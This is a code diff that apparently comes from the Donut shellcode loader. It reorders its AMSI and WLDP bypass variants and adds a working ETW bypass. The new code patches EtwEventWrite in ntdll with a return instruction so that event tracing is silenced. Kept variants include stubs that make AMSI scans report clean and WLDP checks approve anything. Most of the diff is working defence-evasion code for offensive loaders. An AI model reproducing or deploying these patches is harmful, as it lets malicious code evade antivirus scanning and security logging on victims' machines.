@@ -29,26 +29,17 @@
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
-typedef enum _WLDP_HOST_ID { 
-   WLDP_HOST_ID_UNKNOWN     = 0,
-   WLDP_HOST_ID_GLOBAL      = 1,
-   WLDP_HOST_ID_VBA         = 2,
-   WLDP_HOST_ID_WSH         = 3,
-   WLDP_HOST_ID_POWERSHELL  = 4,
-   WLDP_HOST_ID_IE          = 5,
-   WLDP_HOST_ID_MSI         = 6,
-   WLDP_HOST_ID_MAX         = 7
-} WLDP_HOST_ID, *PWLDP_HOST_ID;
+#include "bypass.h"
 
-typedef struct _WLDP_HOST_INFORMATION {
-  DWORD        dwRevision;
-  WLDP_HOST_ID dwHostId;
-  PCWSTR       szSource;
-  HANDLE       hSource;
-} WLDP_HOST_INFORMATION, *PWLDP_HOST_INFORMATION;
 
 #if defined(BYPASS_AMSI_A)
+// This is where you may define your own AMSI bypass.
+// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_A defined.
+BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+  return TRUE;
+}
 
+#elif defined(BYPASS_AMSI_B)
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
 HRESULT WINAPI AmsiScanBufferStub(
     HAMSICONTEXT amsiContext,
@@ -153,8 +144,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     return TRUE;
 }
 
-#elif defined(BYPASS_AMSI_B)
-
+#elif defined(BYPASS_AMSI_C)
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     HMODULE        dll;
     PBYTE          cs;
@@ -194,8 +184,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     return disabled;
 }
 
-#elif defined(BYPASS_AMSI_C)
-
+#elif defined(BYPASS_AMSI_D)
 // Attempt to find AMSI context in .data section of CLR.dll
 // Could also scan PEB.ProcessHeap for this..
 // Disabling AMSI via AMSI context is based on idea by Matt Graeber
@@ -261,18 +250,17 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     }
     return disabled;
 }
-
-#elif defined(BYPASS_AMSI_D)
-// This is where you may define your own AMSI bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_C defined.
-
-BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-    
-}
-
 #endif
 
 #if defined(BYPASS_WLDP_A)
+// This is where you may define your own WLDP bypass.
+// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_A defined.
+
+BOOL DisableWLDP(PDONUT_INSTANCE inst) {
+    return TRUE;
+}
+
+#elif defined(BYPASS_WLDP_B)
 
 // fake function that always returns S_OK and isApproved = TRUE
 HRESULT WINAPI WldpIsClassInApprovedListStub(
@@ -364,11 +352,57 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     
     return TRUE;
 }
-#elif defined(BYPASS_WLDP_B)
-// This is where you may define your own WLDP bypass.
-// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_B defined.
+#endif
 
-BOOL DisableWLDP(PDONUT_INSTANCE inst) {
-    
+#if defined(BYPASS_ETW_A)
+// This is where you may define your own ETW bypass.
+// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+    return TRUE;
 }
+
+#elif defined(BYPASS_ETW_B)
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+    HMODULE dll;
+    DWORD   len, op, t;
+    LPVOID  cs;
+
+    // get a handle to ntdll.dll
+    dll = inst->api.LoadLibraryA(inst->ntdll);
+
+    // resolve address of EtwEventWrite
+    // if not found, return FALSE because it should exist
+    cs = inst->api.GetProcAddress(dll, inst->etwEventWrite);
+    if (cs == NULL) return FALSE;
+
+#ifdef _WIN64
+    // make the memory writeable. return FALSE on error
+    if (!inst->api.VirtualProtect(
+        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+    DPRINT("Overwriting EtwEventWrite");
+
+    // over write with "ret"
+    Memcpy(cs, "\xc3", 1);
+
+    // set memory back to original protection
+    inst->api.VirtualProtect(cs, 1, op, &t);
+#else
+    // make the memory writeable. return FALSE on error
+    if (!inst->api.VirtualProtect(
+        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+
+    DPRINT("Overwriting EtwEventWrite");
+
+    // over write with "ret 14h"
+    Memcpy(cs, "\xc2\x14\x00\x00", 4);
+
+    // set memory back to original protection
+    inst->api.VirtualProtect(cs, 4, op, &t);
+#endif
+
+    return TRUE;
+
+}
+
 #endif
